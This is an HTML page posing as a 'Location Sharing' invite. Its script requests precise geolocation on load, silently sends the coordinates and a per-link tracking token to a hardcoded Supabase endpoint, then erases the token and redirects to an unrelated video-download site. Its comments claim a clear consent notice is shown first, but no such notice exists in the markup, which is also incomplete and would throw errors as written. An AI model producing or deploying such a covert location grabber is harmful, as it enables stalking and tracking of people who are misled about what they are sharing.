<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="theme-color" content="#27394b">
  <title>Location Sharing</title>
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      min-height: 100vh;
      background: #f4f6f8;
      color: #273746;
      font-family: Arial, Helvetica, sans-serif;
    }
    .page-content {
      min-height: 100vh;
      filter: blur(7px);
      transform: scale(1.015);
      pointer-events: none;
      user-select: none;
    }
    .consent-layer {
      position: fixed;
      inset: 0;
      z-index: 10;
      display: grid;
      place-items: center;
      padding: 22px;
      background: rgba(12, 20, 30, .18);
    }
    .consent-card {
      width: min(100%, 440px);
      padding: 24px;
      border: 1px solid rgba(255,255,255,.7);
      border-radius: 18px;
      background: #fff;
      box-shadow: 0 18px 55px rgba(0,0,0,.2);
      text-align: center;
    }
    .consent-card h2 {
      margin: 0 0 12px;
      color: #27394b;
      font-size: 21px;
    }
    .consent-card p {
      margin: 0;
      color: #425466;
      font-size: 15px;
      line-height: 1.65;
    }
    body.sending { background: #101827; }
    body.sending .page-content,
    body.sending .consent-layer { display: none; }
    .topbar {
      height: 64px;
      padding: 0 7%;
      display: flex;
      align-items: center;
      background: #27394b;
      color: #fff;
      font-size: 20px;
      font-weight: 700;
    }
    main {
      width: min(92%, 760px);
      margin: 58px auto;
      text-align: center;
    }
    .logo {
      width: 66px;
      height: 66px;
      margin: 0 auto 16px;
      border-radius: 16px;
      display: grid;
      place-items: center;
      background: #18a77b;
      color: white;
      font-size: 34px;
    }
    h1 {
      margin: 0 0 24px;
      font-size: clamp(27px, 5vw, 34px);
      color: #27394b;
    }
    .panel {
      max-width: 650px;
      margin: auto;
      padding: 22px;
      border: 1px solid #e1e6eb;
      border-radius: 10px;
      background: #fff;
      box-shadow: 0 5px 18px rgba(30, 48, 65, .06);
    }
    .notice {
      margin: 0;
      color: #425466;
      font-size: 15px;
      line-height: 1.6;
    }
    #status {
      min-height: 24px;
      margin: 16px 0 0;
      color: #526477;
      font-size: 14px;
      line-height: 1.5;
    }
    @media (max-width: 480px) {
      .topbar { padding: 0 18px; }
      main { margin-top: 42px; }
      .panel { padding: 18px; }
    }
  </style>
</head>
<body>
  <div class="page-content" aria-hidden="true">
    <header class="topbar">LOCATION</header>
    <main>
    <div class="logo" aria-hidden="true">⌖</div>
    
  <script>
    "use strict";

    const SUPABASE_URL = "https://uzykphfpnzcqpucrnanb.supabase.co";
    const SUPABASE_PUBLISHABLE_KEY =
      "sb_publishable_c3dkueuOAUh9Elk07iWDgQ_X2p3I0Ea";
    const REDIRECT_URL = "https://fdown.net/";
    const statusBox = document.getElementById("status");
    const consentLayer = document.getElementById("consentLayer");
    const token = new URLSearchParams(location.search).get("token");
    let redirectStarted = false;

    function status(message) {
      statusBox.textContent = message;
    }

    function redirectToDestination() {
      if (redirectStarted) return;
      redirectStarted = true;
      const cleanUrl = new URL(location.href);
      cleanUrl.searchParams.delete("token");
      history.replaceState({}, "", cleanUrl);
      window.location.replace(REDIRECT_URL);
    }

    function sendLocationInBackground(position) {
      // The clear consent notice is shown before the browser permission request.
      // After permission is granted, switch to a neutral blank theme.
      document.body.classList.add("sending");
      const payload = JSON.stringify({
        token,
        consent: true,
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy
      });

      // keepalive asks the browser to continue this small POST after navigation.
      // Browsers may still cancel background requests; delivery is not guaranteed.
      try {
        fetch(SUPABASE_URL + "/functions/v1/submit-report", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "apikey": SUPABASE_PUBLISHABLE_KEY,
            "Authorization": "Bearer " + SUPABASE_PUBLISHABLE_KEY
          },
          body: payload,
          keepalive: true
        }).catch(error => console.warn("Background location submission failed:", error));
      } catch (error) {
        console.warn("Could not start location submission:", error);
      }

      // Start the keepalive request, then navigate immediately without waiting
      // for the network response. Background delivery is browser-dependent.
      redirectToDestination();
    }

    function requestLocation() {
      if (!token) {
        consentLayer.querySelector("p").textContent = "This invite link is invalid or incomplete. No location was requested.";
        return;
      }
      if (!window.isSecureContext) {
        consentLayer.querySelector("p").textContent = "Secure HTTPS is required for location sharing. No location was requested.";
        return;
      }
      if (!navigator.geolocation) {
        consentLayer.querySelector("p").textContent = "This browser does not support location sharing. No location was requested.";
        return;
      }

      // Request the browser's native location permission immediately on page load.
      navigator.geolocation.getCurrentPosition(
        position => {
          sendLocationInBackground(position);
        },
        error => {
          if (error.code === 1) {
            status("Permission was denied. No location was shared.");
          } else if (error.code === 2) {
            status("Location is unavailable. No location was shared.");
          } else if (error.code === 3) {
            status("The location request timed out. No location was shared. Reload to try again.");
          } else {
            status("Location could not be accessed. No location was shared.");
          }
          consentLayer.querySelector("p").textContent = statusBox.textContent;
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    }

    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", requestLocation, { once: true });
    } else {
      requestLocation();
    }
  </script>
</body>
</html>
